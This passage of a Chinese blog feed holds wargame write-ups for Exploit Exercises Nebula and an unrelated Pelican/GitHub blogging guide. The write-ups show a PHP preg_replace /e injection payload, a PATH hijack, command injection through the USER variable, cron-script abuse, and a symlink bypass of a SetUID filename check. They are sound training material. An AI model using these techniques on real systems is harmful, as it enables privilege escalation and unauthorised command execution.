  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到PHP，心中大喜，总算碰到一个相对熟悉的语言，老乡见老乡，两眼泪汪汪啊~~&lt;/p&gt;
&lt;p&gt;flag09目录下有一个可执行的flag09（这就是所谓具有SetUID的C语言包装的PHP解释器吧），还有给出代码的flag09.php。代码逻辑还是很简单的，传入两个参数，一个是文件路径，一个没有用到。根据文件路径读出文件之后把Email那部分读出来，替换掉一些字符（反垃圾邮件），之后输出。&lt;/p&gt;
&lt;p&gt;没看出什么有问题的地方，不过传入参数一定是可以利用的点。preg_replace中的e参数用的不多呀，一般都是用i（忽略大小写）。于是查PHP Manual，果不其然，e使preg_replace第二个参数变成函数执行，就和执行eval一样，另外这个参数太危险，在PHP5.5之后废除改用回调函数实现了。一句话木马暴露了！那就构造一下呗。&lt;/p&gt;
&lt;p&gt;于是构造文件内容为:&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;[email abc@def.com\&amp;quot;);system(\&amp;quot;getflag]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;照理说第二个参数应该被拼接成:&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;&amp;quot;spam(\&amp;quot;email abc@def.com\&amp;quot;);system(\&amp;quot;getflag\&amp;quot;)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样就能顺利执行两个函数了。很可惜，天不由人愿，整个东西都被当做字符串被扔到spam函数里了。所以这里如果要探究得看一下PHP源码中具体的处理过程。&lt;/p&gt;
&lt;p&gt;顿时没思路了……之后Google一下php的preg_replace的e参数的漏洞，发现有利用&lt;code&gt;{${function()}}&lt;/code&gt;的技巧。即在&lt;code&gt;{${}}&lt;/code&gt;包裹后的函数会被执行。于是：&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;[email {${system('getflag')}}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;K.O！&lt;/p&gt;</summary><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>Exploit Exercises Nebula level00-04 Writeup</title><link href="http://blog.yyx.name/posts/exploit-exercises-nebula-level-00-04.html" rel="alternate"></link><updated>2014-09-06T16:20:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-06:posts/exploit-exercises-nebula-level-00-04.html</id><summary type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;上上个月成立watch0ut战队之后，开始准备并参与一些CTF比赛。队友大神Jack甩给我们&lt;a href="http://exploit-exercises.com/"&gt;exploit-exercises.com&lt;/a&gt;这个网站，让我们练习练习漏洞利用。&lt;/p&gt;
&lt;p&gt;网站中把漏洞利用分为多类题型，其中Nebula最为简单，主要涉及Linux主机安全及利用的一些常识，可作为整个练习的开始。&lt;/p&gt;
&lt;p&gt;另，本文会遵循能不用安装就安装，能不配置就不配置的最(偷)简(懒)策略来完成所有题型。&lt;/p&gt;
&lt;p&gt;本文会记录我自己做题的思路和手法，供大家参考，也希望诸位能指出我理解或操作不慎处。&lt;/p&gt;
&lt;h1&gt;环境搭建&lt;/h1&gt;
&lt;p&gt;首先&lt;a href="http://exploit-exercises.com/download"&gt;下载&lt;/a&gt;Nebula题目的光盘镜像，该ISO为LiveCD。因此可以不用安装，直接利用现成虚拟机修改为从该ISO启动即可。每次操作完整之后直接点“暂停”保存虚拟机状态即可，下次直接恢复。当然你也可以安装该ISO。&lt;/p&gt;
&lt;p&gt;另外，我使用的光盘为exploit-exercises-nebula-5.iso，本系列Writeup全部在这个版本上完成。&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;Nebula
----------------------------------------------------------------------------------------------
Download        exploit-exercises-nebula-5.iso
----------------------------------------------------------------------------------------------
Version         5
----------------------------------------------------------------------------------------------
Changes         Moved from OVA to bootable CD format. Reduces issues with importing OVA files.
----------------------------------------------------------------------------------------------
SHA1 Checksum   e82f807be06100bf3e048f82e899fb1fecc24e3a
&lt;/code&gt;&lt;/pre&gt;

&lt;h1&gt;统一规则&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;每次任务使用任务的level账户登录并执行flag账户权限可执行的getflag文件（一般是这个名字）。比如，任务1使用level01账户，密码也为level01，你需要去寻找方法获取flag01才可以执行的getflag文件并执行它。&lt;/li&gt;
&lt;li&gt;当需要系统配置时，使用nebula账户，密码也为nebula，并利用sudo执行需要root权限的操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Nebula level00&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the "flag00" account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;p&gt;Alternatively, look at the find man page.&lt;/p&gt;
&lt;p&gt;该题要求寻找一个可以SetUID的程序（该程序属于flag00账户）并运行它。你可以从/（根目录）开始寻找。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;目标很明确，搜索一下属于flag00账户的带有SetUID权限的程序即可。果断man find，搜索一下和权限相关的参数，找到&lt;code&gt;-perm&lt;/code&gt;，并且看到该参数后加入&lt;code&gt;-mode&lt;/code&gt;可以指定匹配所有具有这个权限的文件（注意和&lt;code&gt;mode&lt;/code&gt;及&lt;code&gt;/mode&lt;/code&gt;的区别，这个&lt;code&gt;-&lt;/code&gt;意味着权限的包含关系）。&lt;/p&gt;
&lt;p&gt;到这儿我们需要回顾一下Linux下权限的表示方式：Linux的fs中，所有文件/目录/设备等都具有三个级别的用户权限控制，分别是u所有者，g所属群组，o其他用户。对于每个级别，又能分别控制r读w写x执行权限。另外，还有SetUID和SetGID的特殊权限位。&lt;/p&gt;
&lt;p&gt;权限表示的时候，rwx和无权限&lt;code&gt;-&lt;/code&gt;分别用数字4210表示，并执行位或运算，这样一个级别的用户权限就可以表示了（占用一个byte）。这种方法可以表示出三个不同用户级别的权限。同时加入最前面8bits的特殊权限位，就可以用4byte表示这个文件的完整权限。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;u       g       o
rwx     r--     r--     0744
rwx     ---     ---     0700
rws     rwx     rwx     4777
rws     rws     rwx     6777
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;按照这个标准，我们这儿需要搜索的文件需要SetUID，因此可以构造权限表示为-u=s或者-4000，再考虑到针对文件搜索（限定类型为文件），因此可以构造如下命令（两者一致）。&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;find / -perm -u=s -type f -user flag00 &amp;gt; flag.txt
find / -perm -4000 -type f -user flag00 &amp;gt; flag.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后查看flag.txt中内容，可以发现搜索到两个文件，执行第一个&lt;code&gt;/bin/.../flag00&lt;/code&gt;即可过关。&lt;/p&gt;
&lt;h1&gt;Nebula level01&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;p&gt;题目说程序有漏洞允许任意程序执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;程序逻辑很简单：SetUID和SetGID后执行环境变量指定的echo文件，这样&lt;code&gt;and now what?&lt;/code&gt;就是参数。因此马上能得到如下思路：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;看到&lt;code&gt;/usr/bin/env&lt;/code&gt;就立即反应过来可以从环境变量下手，修改后优先执行自己的程序。&lt;/li&gt;
&lt;li&gt;需要运行getflag，而程序只能运行echo，因此要把echo和getflag关联上。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;于是乎一气呵成执行以下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;ln -s /bin/getflag echo
PATH=/home/level01:$PATH
cd /home/flag01
./flag01
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里软连接需要创建在&lt;code&gt;/home/level01&lt;/code&gt;或&lt;code&gt;/tmp&lt;/code&gt;中，否则没有w权限。至此，此题拿下。&lt;/p&gt;
&lt;h1&gt;Nebula level02&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;p&gt;和上一题一样的题干，还是找到可任意执行程序的漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
  printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);

  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;还是环境变量，这次是$USER，反而简单了，直接截断原来的程序即可。上代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;USER=&amp;quot;;/bin/getflag;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Over :D&lt;/p&gt;
&lt;h1&gt;Nebula level03&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.&lt;/p&gt;
&lt;p&gt;There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;p&gt;题目说检查flag03的home目录，注意里面的文件，同时有一个crontab任务每2分钟执行一次。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;发现writeable.d目录和writeable.sh脚本。脚本内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;for i in /home/flag03/writeable.d/* ; do
    (ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
    rm -f &amp;quot;$i&amp;quot;
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中&lt;code&gt;ulmint -t 5&lt;/code&gt;控制CPU时间不超过5秒，&lt;code&gt;bash -x "$i"&lt;/code&gt;用于执行$i文件。执行完之后删除文件本身。因此，只需要在writeable.d目录下创建文件并执行指令即可。文件内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;/bin/getflag &amp;gt; result.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;等待一段时间，系统会触发这个.sh脚本，之后去看result.txt文件即可发现getflag已经执行。&lt;/p&gt;
&lt;p&gt;当然，这儿如果要看具体的crontab的任务事件，用nebula账户登录，执行&lt;code&gt;sudo crontab -u flag03 -l&lt;/code&gt;即可。&lt;/p&gt;
&lt;h1&gt;Nebula level04&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
&lt;p&gt;寻找方法绕开读取限制，读取token文件内容。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
    printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
    exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
    printf(&amp;quot;You may not access '%s'\n&amp;quot;, argv[1]);
    exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
    err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
    err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
  }

  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;flag04的home目录下有属于level04组的flag04可执行文件和一个token文件（无权限），因此需要调用flag04来读取token。
首先分析程序逻辑，程序有一个参数，但参数名不能是token（和前面一样，用软连接）。之后会读取这个参数为名字的文件，并把文件内容输出到屏幕（1是STD_OUT）。由于flag04目录没有w权限，因此软连接要创建到自己的家目录中。&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;ln -s /home/flag04/token ~/flag04passwd
/home/flag04/flag04 ~/flag04passwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后读取home目录下flag04passwd内容，为flag04密码，用flag04账户和获取的密码登陆后getflag。&lt;/p&gt;</summary><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>利用Pelican在Github上搭建博客</title><link href="http://blog.yyx.name/posts/build-blog-on-github-by-pelican.html" rel="alternate"></link><updated>2014-08-14T16:17:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-08-14:posts/build-blog-on-github-by-pelican.html</id><summary type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;一直知道Github有Page功能，但是从来没想到把它用来做Blog。那天突然发现静态博客系统Jekyll，让我这种用惯Wordpress的人顿感欣喜，简单、轻量、纯粹的博客才是那个真正的博客。静态博客有着自己的优势，比如速度快，安全性高，同时Github的免费空间足够大(300M)，还提供CDN，甚至可以绑定域名。这比免费动态主机、自己买个虚拟空间或VPS架个动态CMS都要来的划算。最最重要的是，Github本身是分布式机制的，这样你的文章完全就是在本地写(妈妈再也不用担心断网了)，之后sync到服务器即可，相当于多重备份+Git强大的版本管理。不过Jekyll基于Ruby，个人对于Ruby只有耳闻没有尝试，因此只能作罢(当然也放弃了Octopress之类基于Jekyll的)，于此同时google到了基于Python的静态博客系统Pelican，因此开始折腾。一周后自制主题的Blog总算竣工，因此决定撰文以方便后人。&lt;/p&gt;
&lt;p&gt;OK，在正式开始之前还要说几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;虽然静态博客系统有很多优势，但是也有很多缺陷。当然大部分缺陷可以用一些小hint来弥补，这对于优势来说还是可以接受的，当然你需要既然决然的去折腾。&lt;/li&gt;
&lt;li&gt;网上Jekyll系+Github建博客的文章很多，Pelican也不算特别少，因此本文力求写出一些不一样的、有营养的东西。&lt;/li&gt;
&lt;li&gt;Pelican升级时候配置文件做了较大变化(虽然我认为对于接口或配置的不严谨设置与改动是不可取的)，不排除其他工具或环境的版本升级时候的变化。如不信碰到，请自行查阅相关工具或环境的手册，RTFM :D。 &lt;/li&gt;
&lt;li&gt;成文仓促，水平有限，望不吝赐教。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So, let's start...&lt;/p&gt;
&lt;h1&gt;基础准备&lt;/h1&gt;
&lt;h2&gt;系统环境&lt;/h2&gt;
&lt;p&gt;由于平时办公环境还是以Win7为主，因此还是决定将环境搭建在Windows下。Linux下搭建环境比Windows更加简单，网上也有相关文章，请自行检索。&lt;/p&gt;
&lt;h2&gt;套件选择&lt;/h2&gt;
&lt;p&gt;必装：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python3 (2 or 3你自己纠结去)&lt;/li&gt;
&lt;li&gt;pip和setuptool(为了方便package的安装)&lt;/li&gt;
&lt;li&gt;Pelican3&lt;/li&gt;
&lt;li&gt;Markdown（个人觉得Markdown语法简洁优美，Pelican3还支持其他语法）&lt;/li&gt;
&lt;li&gt;make工具（GNU的make，win下的nmake不行）&lt;/li&gt;
&lt;li&gt;Git工具集（当然还要去Github上搞个账号）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可选（主要这里比较折腾）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bootstrap3 (Twitter出品的快速网站搭建框架)&lt;/li&gt;
&lt;li&gt;Disqus (可以选择国内的社会化评论系统，比如多说)&lt;/li&gt;
&lt;li&gt;Google Analytics (可以选择其他网站分析服务商，比如CNZZ)&lt;/li&gt;
&lt;li&gt;MarkdownPad2 (可视化的Markdown写作软件，还有很多可以选择的，甚至是在线的)&lt;/li&gt;
&lt;li&gt;一些基于JQuery的插件&lt;/li&gt;
&lt;li&gt;一堆其他什么的……&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;搭建环境&lt;/h1&gt;
&lt;h2&gt;安装Python&lt;/h2&gt;
&lt;p&gt;在&lt;a href="https://www.python.org/downloads/"&gt;https://www.python.org/downloads/&lt;/a&gt;下载Python并安装，就那么简单。安装完成后把Python的安装路径扔到环境变量Path里。&lt;/p&gt;
&lt;h2&gt;安装pip和setuptool&lt;/h2&gt;
&lt;p&gt;在&lt;a href="https://pip.pypa.io/en/latest/installing.html"&gt;https://pip.pypa.io/en/latest/installing.html&lt;/a&gt;下载get-pip.py。打开cmd，进入get-pip.py所在目录，之后执行&lt;code&gt;python get-pip.py&lt;/code&gt;，pip和setuptool都会安装好。&lt;/p&gt;
&lt;h2&gt;安装Pelican和Markdown&lt;/h2&gt;
&lt;p&gt;装好了pip就方便了，直接执行以下命令。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip install pelican
pip install markdown
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之后将Python目录下的script目录路径加入环境变量Path中。&lt;/p&gt;
&lt;h2&gt;安装Git工具&lt;/h2&gt;
&lt;p&gt;下载Github for Windows &lt;a href="https://windows.github.com/"&gt;https://windows.github.com/&lt;/a&gt; 并安装即可。
关于Git的命令，推荐一个简单的&lt;a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000"&gt;git教程&lt;/a&gt;。和图形界面相比，git的shell也非常好用。&lt;/p&gt;
&lt;h2&gt;其他&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;make只需要下载下来就可以了&lt;a href="http://www.equation.com/servlet/equation.cmd?fa=make"&gt;http://www.equation.com/servlet/equation.cmd?fa=make&lt;/a&gt;。&lt;/li&gt;
&lt;li&gt;网上可能会推荐把Pelican装在虚拟环境virtalenv中，这点你自己决定。&lt;/li&gt;
&lt;li&gt;可选部分的下载和安装在写到的时候再给出。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;发表Blog的完整流程&lt;/h1&gt;
&lt;p&gt;Pelican创建Blog的步骤可以总结为：创建框架(包括目录结构，主题模板，配置文件)--&amp;gt;(创建主题)--&amp;gt;写文章--&amp;gt;生成html--&amp;gt;(上传Github等)。&lt;/p&gt;
&lt;p&gt;当碰到问题时候记得查阅手册，这部分在手册&lt;a href="http://docs.getpelican.com/"&gt;http://docs.getpelican.com/&lt;/a&gt;的getting started中。&lt;/p&gt;
&lt;h2&gt;创建框架&lt;/h2&gt;
&lt;p&gt;所谓的框架就是一个静态Blog的生成骨架，Pelican只需要一句命令即可（先cd到要生成的目录中）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pelican-quickstart
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行命令后根据提示设置，会生成默认的配置文件。此时Pelican已经为我们构建了框架，结构如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yourproject/
├── content             #写好的Markdown格式的博文
│   └── (pages)         #Markdown格式的静态界面(比如About，同WP的Page)
├── output              #通过Pelican最终生成的html界面
├── develop_server.sh   #Pelican服务器的脚本
├── fabfile.py          #生成和上传等自动化操作
├── Makefile            #make的自动化脚本
├── pelicanconf.py      #主配置文件(测试环境)
└── publishconf.py      #主配置文件的扩展，用于(生产环境)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;写文章&lt;/h2&gt;
&lt;p&gt;这里其实和Pelican没多大关系了。这里使用&lt;a href="http://wowubuntu.com/markdown/"&gt;Makedown语法&lt;/a&gt;写文章，并保存为.md文件。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Title: My super title
Date: 2010-12-03 10:20
Category: Python
Tags: pelican, publishing
Slug: my-super-post
Author: Alexis Metaireau
Summary: Short version for index and feeds

This is the content of my super blog post. #正文内容
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面是官方给出的模板，可以看到正文内容前为文章的meta数据，你可以制定文章的标题、日期、类别、标签、路径名、作者、摘要等(这些信息部分会出现在最终生成html的meta数据中，当然这取决于主题文件是否引用这些数据)。这些里面只有Title和Date是必须的(默认配置下，Date要自己指定是不是很BT，法国人的思维真是……)。meta块之后就用Makrdown写文章啦~当然你可以和我上面说的一样搞一个Markdown的可视化编辑器，写起来很愉快。Markdown语法实现不了的直接用html的语法即可。&lt;/p&gt;
&lt;h2&gt;Pelican重要的操作命令&lt;/h2&gt;
&lt;p&gt;目录中的makefile非常重要，通过make调用makefile中的命令即可完成相关操作。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make html           #创建静态界面
make regenerate     #修改后自动创建静态界面
make serve          #创建服务器
make devserver      #相当于regenerate+serve
make publish        #生成用于发布的html
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;手册上还有其他一些命令，请自行发掘。&lt;/p&gt;
&lt;h2&gt;生成与预览&lt;/h2&gt;
&lt;p&gt;文章写好了就用上面的&lt;code&gt;make html&lt;/code&gt;生成文章，你需要反复不停修改和生成的话就用&lt;code&gt;make regenerate&lt;/code&gt;，每次修改会自动生成新的html。之后用&lt;code&gt;make serve&lt;/code&gt;开启服务器，默认&lt;code&gt;http://localhost:8000&lt;/code&gt;可浏览你的Blog。&lt;/p&gt;
&lt;p&gt;当然最后发布的请使用&lt;code&gt;make publish&lt;/code&gt;，该配置更加适合用于正式发布。&lt;/p&gt;
&lt;h2&gt;Github相关操作&lt;/h2&gt;
&lt;p&gt;以上步骤后静态blog已经生成，默认在output文件夹中。下面需要把它上传到github中。所有关于github page的操作都在&lt;a href="http://pages.github.io"&gt;http://pages.github.io&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;先去Github注册账号，比如用户名是username，然后Create New Repository, Repository的名字必须为username.github.io（网上流传的.com的貌似已经无效了，所以看手册是多么的重要）。&lt;/p&gt;
&lt;p&gt;创建好了之后直接点上面的绿色的set up in desktop就会打开桌面端的Git图形化操作界面。之后会让你同步一个本地的目录，这样本地的目录就和远程的关联好了。commit之后sync即可。&lt;/p&gt;
&lt;p&gt;当然也可以用gitshell，命令也很简单。首先进入需要上传的目录，之后执行(具体命令含义可以看相关git教程)：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git init
git remote origin https://github.com/username/username.github.io.git
git pull
git add .
git commit -m "update"
git push origin master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;大概等几分钟之后即可访问username.github.io。至此，一个完整的Pelican+Github生成静态Blog的流程已经完成。&lt;/p&gt;
&lt;h2&gt;一些问题和处理&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;对于Python3默认的配置可能会出现问题，需要将develop_server.sh将&lt;code&gt;PY=${PY:-python2}&lt;/code&gt;改为python3，makefile中如果有问题也需要修改。&lt;/li&gt;
&lt;li&gt;可以将pelicanconf.py中的SITEURL改成&lt;code&gt;http://localhost:8000&lt;/code&gt;，将publishconf.py中的SITEURL改为&lt;code&gt;http://username.github.io&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;主题制作&lt;/h1&gt;
&lt;p&gt;到这儿，你应该已经能顺利搭建起一个基于Pelican的Blog并在Github上发布了。下面我们探讨一下Pelican下的个性化主题制作。主题制作的官方文档&lt;a href="http://docs.getpelican.com/en/3.4.0/themes.html"&gt;在此&lt;/a&gt;，请不断查阅与参考。另外，Pelican官方的Github上也有别人制作好的主题，你可以&lt;a href="https://github.com/getpelican/pelican-themes"&gt;点这儿&lt;/a&gt;进去参考或者下载。&lt;/p&gt;
&lt;h2&gt;制作思路及组件&lt;/h2&gt;
&lt;p&gt;Pelican的主题制作基于&lt;a href="http://jinja.pocoo.org/"&gt;Jinjia模板引擎&lt;/a&gt;，看这个名字和Logo就知道是小日本的作品了，如果你曾经用过smarty（N年以前了）或者是类似的模板引擎，基本能秒速上手。利用模板引擎的优势就是视图和数据的分离，整个过程相当于你写的.md文件就是数据，通过Pelican驱动之后按照Jinjia作为模板填充数据，并输出最终html。&lt;/p&gt;
&lt;p&gt;对于主题制作，无非就是前端的一些东西，什么html啊js啊之类的东西，我这边采用bootstrap3加上一堆插件的方法创建html，之后改写成Jinjia模板。&lt;/p&gt;
&lt;p&gt;通过主题制作，基本可以搞明白大部分Pelican配置的含义。另外，由于这块内容本身覆盖知识面很广，这里只能按照Pelican中特有的一些规定展开，周边的前端知识只能说到一些必要的，其他方面还请读者自行补充。&lt;/p&gt;
&lt;h2&gt;主题结构&lt;/h2&gt;
&lt;p&gt;首先创建主题目录，我准备放在yourproject/theme目录下，此时打开&lt;code&gt;pelicanconf.py&lt;/code&gt;，添加如下字段：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;THEME = "theme"             #主题目录
THEME_STATIC_DIR = 'theme'  #生成后的主题目录
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;手册上给出如下主题结构，这写文件可以放在yourproject/theme目录下（具体哪儿都可以通过配置文件指定）。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;├── static
│   ├── css
│   └── images
└── templates
    ├── archives.html         // 文章归档
    ├── period_archives.html  // 按照时间排序的归档
    ├── article.html          // 每篇文章
    ├── author.html           // 每个作者
    ├── authors.html          // 所有作者
    ├── categories.html       // 所有分类
    ├── category.html         // 每个分类
    ├── index.html            // 主页
    ├── page.html             // page界面（自定义的界面）
    ├── tag.html              // 每个不同tag的界面
    └── tags.html             // 总tag界面，可以创建tag云
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看到上面的目录构造可以基本明白各个文件的作用了。static中的文件会被完整复制到生成目录中，而templates中的文件则会通过Pelican处理。&lt;/p&gt;
&lt;p&gt;需要特别说明的是，不是所有文件都是必须的，比如我的Blog就我一个人写文章，只有一个作者，所以author和authors我就不用，你可以保留文件，之后把里面内容删除即可。当然你也可以创建文件，采用Jinjia的包含语句包含到其他界面中，这在后面会说明。&lt;/p&gt;
&lt;h2&gt;主题和配置&lt;/h2&gt;
&lt;p&gt;待续……&lt;/p&gt;</summary><category term="github"></category><category term="pelican"></category><category term="bootstrap"></category></entry></feed>